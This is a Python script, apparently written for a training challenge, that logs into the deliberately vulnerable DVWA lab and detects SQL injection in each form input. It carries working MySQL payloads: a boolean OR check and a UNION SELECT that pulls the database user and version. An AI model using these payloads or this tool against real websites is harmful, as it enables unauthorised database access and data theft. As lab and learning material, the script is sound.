"""
Usage:
    sqli_challenge.py --page_url=<page_url> [--username=<username>] [--password=<password>]

Options:
    --page_url=<page_url>  URL of the page where to detect SQL injections
    --username=<username>  What username to use on the login page [default: admin]
    --password=<password>  What password to use on the login page [default: password]
"""

import re
import sys
import random
import docopt
import urlparse
import mechanize
import validators

class MySQL_Injection(object):
    def __init__(self):
        self.postfix          = str(random.random())
        self.user_prefix      = "{0}-usr".format(self.postfix)
        self.version_prefix   = "{0}-ver".format(self.postfix)
        self.logical_check    = "1' OR 1 #"
        self.user_and_version = "1' UNION SELECT CONCAT('{user_prefix}-', user(), '-{postfix}'), CONCAT('{version_prefix}-', version(), '-{postfix}'); #".format(
            user_prefix=self.user_prefix, version_prefix=self.version_prefix, postfix=self.postfix)

class SqlInjectionDetector(object):
    def __init__(self, browser):
        self.browser = browser
        self.db_spec = MySQL_Injection()

    def _submit_form(self, form):
        self.browser.form = form
        response = self.browser.submit()

        return response.read()

    def check_form(self, form):
        result = {
            'inputs'     : [],
            'db_user'    : None,
            'db_version' : None,
        }

        for control in form.controls:
            if control.type not in ('text', 'hidden'):
                continue

            preserved_value = control.value
            content_lengths = []

            for new_value in ('1', self.db_spec.logical_check):
                control.value = new_value
                resp_content  = self._submit_form(form)

                # Subtract new_value's length to account for the fact the the differences in content
                # lengths may have been caused by the presence of new_value on the page. It will not
                # work on pages where other dynamic blocks of varying length are present, and it may
                # produce misleading results if the logical check's value is shorter, but these are
                # covered by the confirmation check which attempts to get the DB's user and version.
                content_lengths.append(len(resp_content) - len(new_value))

            if content_lengths[0] < content_lengths[1]:
                control.value = self.db_spec.user_and_version
                resp_content  = self._submit_form(form)

                db_user    = re.search(r"{}-([^'].*?)-{}".format(self.db_spec.user_prefix, self.db_spec.postfix), resp_content)
                db_version = re.search(r"{}-([^'].*?)-{}".format(self.db_spec.version_prefix, self.db_spec.postfix), resp_content)

                if db_user and db_version:
                    result['inputs'].append(control.name)

                    result['db_user']    = db_user.group(1)
                    result['db_version'] = db_version.group(1)

            control.value = preserved_value

        return result

class DVWABrowser(mechanize.Browser):
    """ Add ability to login to DVWA """

    def find_form_by_action(self, action):
        return next(form for form in self.forms() if form.action.endswith(action))

    def login(self, username, password):
        current_url = self.geturl()
        login_form  = self.find_form_by_action(current_url)

        login_form['username'] = username
        login_form['password'] = password

        self.form = login_form
        self.submit()

        return not self.geturl().endswith(current_url)

def indent(string, level=0):
    return "{}{}".format("  " * level, string)

def main(page_url, credentials):
    if not validators.url(page_url):
        sys.exit("{} is not a valid URL".format(page_url))

    browser = DVWABrowser()
    browser.set_handle_robots(False)

    browser.open(page_url)

    # Handle redirect to the login page by logging in
    if browser.geturl().endswith('/login.php'):
        if not browser.login(credentials['username'], credentials['password']):
            sys.exit("Login failed. Did you provide right credentials?")

        browser.open(page_url)

    # 'not in' is required to work correctly when a trailing slash is either present or missing
    if page_url not in browser.geturl():
        sys.exit("Cannot load {}".format(page_url))

    path = urlparse.urlparse(page_url)[2]
    browser.set_cookie('security=low; Path={}'.format(path))

    sqli_detector = SqlInjectionDetector(browser)
    forms_count   = len(list(browser.forms()))

    print indent("{} form(s) found on {}".format(forms_count, page_url))

    for form in browser.forms():
        indent_level = 1
        print "\n" + indent("Checking form with action={}\n".format(form.action), indent_level)

        result = sqli_detector.check_form(form)
        indent_level += 1

        if result['inputs']:
            print indent("Found vulnerable inputs: {}".format(result['inputs']), indent_level)
            print indent("Database info: user={}, version={}".format(result['db_user'], result['db_version']), indent_level)
        else:
            print indent("Vulnerability was not detected", indent_level)


if __name__ == '__main__':
    args = docopt.docopt(__doc__)

    main(args['--page_url'], {
        'username': args['--username'],
        'password': args['--password'],
    })